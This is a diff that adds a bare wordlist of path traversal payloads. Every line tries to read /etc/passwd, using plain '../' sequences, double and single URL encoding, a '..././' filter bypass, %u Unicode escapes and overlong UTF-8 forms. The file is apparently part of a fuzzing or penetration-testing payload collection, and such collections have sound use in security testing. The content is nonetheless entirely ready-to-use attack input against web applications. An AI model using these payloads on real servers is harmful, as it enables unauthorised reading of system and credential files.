@@ -1,0 +1,21 @@
+/etc/passwd
+../../../../../etc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+..././..././..././..././..././..././..././..././..././..././etc/passwd
+\/etc\/passwd
+
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc/passwd
+%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd
+
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+%c0%2e, %e0%40%ae, %c0ae%c0%2e, %e0%40%ae, %c0ae%c0%af, %e0%80%af, %c0%2f%c0%2e, %e0%40%ae, %c0ae%c0%2e, %e0%40%ae, %c0ae%c0%af, %e0%80%af, %c0%2f%c0%2e, %e0%40%ae, %c0ae%c0%2e, %e0%40%ae, %c0ae%c0%af, %e0%80%af, %c0%2f%c0%2e, %e0%40%ae, %c0ae%c0%2e, %e0%40%ae, %c0ae%c0%af, %e0%80%af, %c0%2fetc%c0%af, %e0%80%af, %c0%2fpasswd
+
+
+
+
+
